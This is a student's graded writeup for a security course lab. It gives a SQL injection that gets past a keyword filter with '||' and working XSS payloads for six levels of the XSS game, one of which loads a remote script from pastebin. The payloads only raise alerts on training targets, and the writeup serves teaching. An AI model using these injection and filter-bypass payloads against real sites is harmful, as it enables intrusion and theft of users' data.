# Crypto II Writeup

Name: Christopher Lai
Section: 0101

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Christopher Lai

## Assignment Writeup

### Part 1 (40 Pts)

I poked around the website for a little bit and noticed that the website queries a database for different items.  These start at 0 and go up.  I tried a basic sql injection of ```http://1337bank.money:5000/item?id=0' or '1'='1```, but got the message ```ERROR: ATTEMPTED SQL INJECTION DETECTED```.  The server is checking for some disallowed characters in the backend so I instead used the symbol ```||``` instead of the word ```or```.

This is the query that gave me the flag.

```http://1337bank.money:5000/item?id=0'||'1'='1```

Flag: ```CMSC389R-{y0u_ar3_th3_SQ1_ninj@}```

### Part 2 (60 Pts)

#### Level 1: 
They gave a vulnerable field where I could inject code, so I put the alert inside script tags and it worked.
```html
<script>alert("hi");</script>
``` 

#### Level 2:
There was a vulnerable image tag where I could inject my own code into the ```onerror``` function, which executes any arbitrary javascript.
```html
<img src="hi" onerror=alert("hi")>
```

#### Level 3:
The page used the ```num``` parameter passed in to get the image.  If you close off the quote early similar to a sql injection, you can then put your own code after.  I used the ```onerror``` function from the last challenge to input the alert.

```
https://xss-game.appspot.com/level3/frame#1' onerror='alert("hi")'
```

#### Level 4:
The input box is not sanitizing user input so we can prematurely close the call to startTimer and call our alert.

Call to startTimer:
```html
startTimer('{{ timer }}');"
```

Inject:
```html
'); alert('hi
```

#### Level 5:
There is a ```next``` parameter in the url that is used as the target for the ```a href```.  You can call javascript from within an ```a``` tag by using ```javascript:```.  After you inject the code below, type in an email and hit next.

```html
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("hi")
```

#### Level 6:
This site automatically loads any arbitrary file, but first checks that http or https is not in the url.  I saw the regex and capitalized HTTPS so it would load my file.  I hosted my file on pastebin, and simply put ```alert("hi");``` inside.

regex
```javascript
if (url.match(/^https?:\/\//)) {
```

url:
```
https://xss-game.appspot.com/level6/frame#HTTPS://pastebin.com/raw/5m3aMjSK
```




